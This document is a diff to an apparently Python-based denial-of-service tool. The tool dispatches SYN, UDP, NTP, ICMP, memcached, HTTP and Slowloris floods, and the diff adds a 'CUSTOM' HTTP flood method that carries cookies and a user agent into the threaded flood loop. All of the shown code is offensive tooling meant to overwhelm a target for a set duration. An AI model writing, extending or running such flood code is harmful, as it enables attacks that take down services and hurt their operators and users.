@@ -16,7 +16,7 @@ def GetMethodByName(method):
         dir = "tools.EMAIL.main"
     elif method in ("SYN", "UDP", "NTP", "POD", "ICMP", "MEMCACHED"):
         dir = f"tools.L4.{method.lower()}"
-    elif method in ("HTTP", "SLOWLORIS"):
+    elif method in ("HTTP", "SLOWLORIS", "CUSTOM"):
         dir = f"tools.L7.{method.lower()}"
     else:
         raise SystemExit(
@@ -38,12 +38,14 @@ def GetMethodByName(method):
 class AttackMethod:
 
     # Constructor
-    def __init__(self, name, duration, threads, target):
+    def __init__(self, name, duration, threads, target, cookies, user_agent):
         self.name = name
         self.duration = duration
         self.threads_count = threads
         self.target_name = target
         self.target = target
+        self.cookies = cookies
+        self.user_agent = user_agent
         self.threads = []
         self.is_running = False
 
@@ -68,9 +70,13 @@ class AttackMethod:
         self.is_running = False
 
     # Run flooder
+    # Note that we need a special case for the CUSTOM method since it requires additional arguments.
     def __RunFlood(self):
         while self.is_running:
-            self.method(self.target)
+            if self.name == 'CUSTOM':
+                self.method(self.target, self.cookies, self.user_agent)
+            else:
+                self.method(self.target)
 
     # Start threads
     def __RunThreads(self):
@@ -107,7 +113,10 @@ class AttackMethod:
             target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
         duration = format_timespan(self.duration)
         print(
-            f"{Fore.MAGENTA}[?] {Fore.BLUE}Starting attack to {target} using method {self.name}.{Fore.RESET}\n"
+            # print cookies
+            f"{Fore.MAGENTA}[?] {Fore.BLUE}Cookies: {self.cookies}{Fore.RESET}\n"
+            f"{Fore.MAGENTA}[?] {Fore.BLUE}User-Agent: {self.user_agent}{Fore.RESET}\n"
+            f"{Fore.MAGENTA}[?] {Fore.BLUE}Starting attack to{Fore.RESET} {Fore.CYAN}{target}{Fore.RESET} using method {Fore.CYAN}{self.name}{Fore.RESET}\n"
             f"{Fore.MAGENTA}[?] {Fore.BLUE}Attack will be stopped after {Fore.MAGENTA}{duration}{Fore.BLUE}.{Fore.RESET}"
         )
         self.is_running = True
